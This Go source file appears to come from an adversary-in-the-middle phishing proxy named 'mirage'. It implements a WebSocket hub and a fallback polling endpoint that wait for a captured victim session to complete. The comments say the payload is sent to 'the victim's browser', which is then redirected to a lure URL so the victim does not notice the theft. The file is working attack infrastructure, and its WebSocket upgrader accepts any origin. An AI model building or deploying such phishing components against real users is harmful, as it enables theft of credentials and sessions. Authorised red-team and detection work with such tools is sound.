package proxy

import (
	"encoding/json"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"github.com/travisbale/mirage/internal/aitm"
)

// redirectMsg is the JSON payload sent to the victim's browser over WebSocket
// when session completion fires.
type redirectMsg struct {
	RedirectURL string `json:"redirect_url"`
}

type eventSubscriber interface {
	Subscribe(eventType aitm.EventType) <-chan aitm.Event
}

// WSHub manages active WebSocket connections waiting for session completion.
// When EventSessionCompleted fires, the hub sends the redirect URL to all
// WebSocket connections waiting on that session ID.
type WSHub struct {
	upgrader websocket.Upgrader
	mu       sync.Mutex
	waiting  map[string][]chan redirectMsg // session ID → waiting channels
	logger   *slog.Logger
}

// NewWSHub creates a WSHub and subscribes to EventSessionCompleted on bus.
func NewWSHub(bus eventSubscriber, logger *slog.Logger) *WSHub {
	hub := &WSHub{
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		waiting: make(map[string][]chan redirectMsg),
		logger:  logger,
	}
	go hub.listenCompletions(bus)
	return hub
}

// listenCompletions fans out EventSessionCompleted events to all waiting connections.
func (h *WSHub) listenCompletions(bus eventSubscriber) {
	completionCh := bus.Subscribe(aitm.EventSessionCompleted)
	for event := range completionCh {
		sess, ok := event.Payload.(*aitm.Session)
		if !ok {
			continue
		}
		h.mu.Lock()
		waiters := h.waiting[sess.ID]
		delete(h.waiting, sess.ID)
		h.mu.Unlock()

		msg := redirectMsg{RedirectURL: sess.LureRedirectURL()}
		for _, waiterCh := range waiters {
			waiterCh <- msg
		}
	}
}

// HandleUpgrade upgrades an HTTP connection to WebSocket, waits for the session
// to complete, then sends the redirect message and closes.
// Route: GET /ws/{sid}
func (h *WSHub) HandleUpgrade(w http.ResponseWriter, r *http.Request, sessionID string) {
	conn, err := h.upgrader.Upgrade(w, r, nil)
	if err != nil {
		h.logger.Warn("wshub: upgrade failed", "error", err)
		return
	}
	defer conn.Close()

	resultCh := make(chan redirectMsg, 1)
	h.mu.Lock()
	h.waiting[sessionID] = append(h.waiting[sessionID], resultCh)
	h.mu.Unlock()

	select {
	case msg := <-resultCh:
		if err := conn.WriteJSON(msg); err != nil {
			h.logger.Warn("wshub: write failed", "session_id", sessionID, "error", err)
		}
	case <-time.After(10 * time.Minute):
		// Session timed out — client will fall back to polling.
		h.logger.Debug("wshub: timeout waiting for session completion", "session_id", sessionID)
	}
}

// HandleTelemetryDone is the fallback polling endpoint GET /t/{sid}/done.
// Returns {"redirect_url":"..."} if the session is complete, {"done":false} otherwise.
func HandleTelemetryDone(store interface {
	GetSession(id string) (*aitm.Session, error)
}) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Extract session ID from the path: /t/{sid}/done
		// Simple path parsing: last component before /done is the session ID.
		path := r.URL.Path
		var sessionID string
		for i := len(path) - 1; i >= 0; i-- {
			if path[i] == '/' {
				if i+1 < len(path) {
					// Check if this is the /done suffix
					if path[i:] == "/done" {
						rest := path[:i]
						for j := len(rest) - 1; j >= 0; j-- {
							if rest[j] == '/' {
								sessionID = rest[j+1:]
								break
							}
						}
					}
				}
				break
			}
		}

		w.Header().Set("Content-Type", "application/json")
		sess, err := store.GetSession(sessionID)
		if err != nil || !sess.IsDone() {
			json.NewEncoder(w).Encode(map[string]bool{"done": false})
			return
		}
		json.NewEncoder(w).Encode(redirectMsg{RedirectURL: sess.LureRedirectURL()})
	}
}
